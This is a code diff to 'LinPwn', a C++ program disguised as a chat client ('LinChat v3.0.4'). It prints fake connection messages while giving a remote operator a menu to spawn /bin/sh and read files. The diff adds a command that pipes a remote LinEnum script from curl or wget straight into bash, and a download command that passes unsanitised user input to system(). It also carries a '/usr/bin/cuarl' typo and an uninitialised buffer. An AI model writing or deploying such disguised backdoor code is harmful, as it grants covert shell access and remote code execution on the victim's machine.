@@ -31,7 +31,7 @@
 #include <csignal>
 #include <string>
 
-#define BUFFER 40
+#define BUFFER 200
 #define SD 0
 
 
@@ -40,7 +40,7 @@ void get_input(char *option) {
 
   for (unsigned int i = 0; i <= strnlen(option, BUFFER); i++) {
     if (option[i] == '\n') {
-        option[i] = '\0';
+      option[i] = '\0';
     }
   }
 }
@@ -66,7 +66,6 @@ class Banner {
     write(SD, "\n\0", 2);
   }
 
-
   void get_help() {
     write(SD, "\n\0", 2);
     write(SD, "Type banner to show this banner.\n\0", 33);
@@ -74,7 +73,6 @@ class Banner {
     write(SD, "Type exit to quit LinPwn.\n\0", 28);
     write(SD, "^C to exit quietly (LinChat doesnt close)\n\0", 42);
   }
-
 
   void get_sysinfo() {
     struct utsname utsinfo;
@@ -210,13 +208,16 @@ class Commands {
  public:
   void list_commands() {
     write(SD, "\x1b[32mCommands: \n\0", 18);
-    write(SD, "1. shell\n\0", 10);
-    write(SD, "2. readfile\n\0", 14);
+    write(SD, "1. shell - Executes /bin/sh\n\0", 30);
+    write(SD, "2. readfile - Print the contents of a file.\n\0", 45);
+    write(SD, "3. enumerate - Download and run LinEnum "
+      "(requires internet access)\n\0", 68);
+    write(SD, "4. download - Downloads a file\n\0", 33);
   }
 
   void shell() {
     char option[BUFFER];
-    char errors[BUFFER] = " 2>/dev/null\0";
+    const char *errors = " 2>/dev/null";
     write(SD, "\x1b[32mExecuting /bin/sh\n\0", 25);
     write(SD, "Type exit to return to LinPwn.\n\0", 33);
 
@@ -252,6 +253,55 @@ class Commands {
     }
   }
 
+  void enumeration() {
+    FILE *check_curl = fopen("/usr/bin/curl", "rb");
+    FILE *check_wget = fopen("/usr/bin/wget", "rb");
+    const char *curl = "curl https://raw.githubusercontent.com/"
+      "rebootuser/LinEnum/master/LinEnum.sh 2>/dev/null | bash  2>/dev/null";
+    const char *wget = "wget -O - https://raw.githubusercontent.com/"
+      "rebootuser/LinEnum/master/LinEnum.sh 2>/dev/null | bash  2>/dev/null";
+
+    if (check_curl) {
+      system(curl);
+      return;
+    } else if (check_wget) {
+      system(wget);
+      return;
+    }
+
+    write(SD, "\x1b[33mIf LinEnum didnt run curl"
+      " or wget may not be installed\n\0", 62);
+    write(SD, "or you do not have internet access\n\0", 36);
+    return;
+  }
+
+  void download() {
+    FILE *check_curl = fopen("/usr/bin/cuarl", "rb");
+    FILE *check_wget = fopen("/usr/bin/wget", "rb");
+    char command[BUFFER];
+    const char *curl = "curl ";
+    const char *wget = "wget ";
+    const char *errors = " 2>/dev/null";
+    char option[BUFFER];
+
+    if (check_curl) {
+      strncat(command, curl, BUFFER);
+    } else if (check_wget) {
+      strncat(command, wget, BUFFER);
+    } else {
+      write(SD, "\x1b[33mCurl or Wget is not installed\n\0", 33);
+      return;
+    }
+
+    write(SD, "\x1b[32mEnter the URL of the target "
+      "file to download it\n\0", 55);
+    write(SD, "\x1b[31mDownload> \0", 15);
+    get_input(option);
+    strncat(command, option, BUFFER);
+    strncat(command, errors, BUFFER);
+    system(command);
+  }
+
   void quit() {
     write(SD, "\x1b[33mClosing connection...\n\0", 28);
   }
@@ -279,8 +329,8 @@ class Commands {
 };
 
 int handler() {
-  Commands commands;
   Banner banner;
+  Commands commands;
   char *option = new char[BUFFER];
   get_input(option);
 
@@ -296,8 +346,12 @@ int handler() {
     commands.read_file();
     write(2, "Unable to connect to chat server\n\0", 35);
     write(2, "Retrying...\n\0", 14);
+  } else if (strncmp(option, "enumerate\0", 9) == 0) {
+    commands.enumeration();
   } else if (strncmp(option, "commands\0", 10) == 0) {
     commands.list_commands();
+  } else if (strncmp(option, "download\0", 9) == 0) {
+    commands.download();
   } else if (strncmp(option, "exit\0", 5) == 0) {
     commands.quit();
     return 1;
@@ -313,22 +367,23 @@ int handler() {
   return 0;
 }
 
+void loop() {
+  do {
+    write(SD, "\x1b[31m>>> \0", 10);
+  } while (handler() != 1);
+}
+
 int main() {
   signal(SIGPIPE, SIG_IGN);
   write(2, "\x1b[32mLinChat v3.0.4\n\0", 20);
   write(2, "Connecting to the chat server...\n\0", 34);
+  Banner banner;
   Connection connection;
   connection.connection_open();
-  Banner banner;
   write(2, "Connected\n\0", 10);
   write(2, "Welcome to the chat room.\n\0", 26);
   write(2, "-------------------------\n\0", 26);
   banner.print_banner();
-
-  do {
-    write(SD, "\x1b[31m>>> \0", 10);
-  } while (handler() != 1);
-
-  write(2, "\x1b[0mSegmentation fault\n\0", 25);
+  loop();
   return 0;
 }
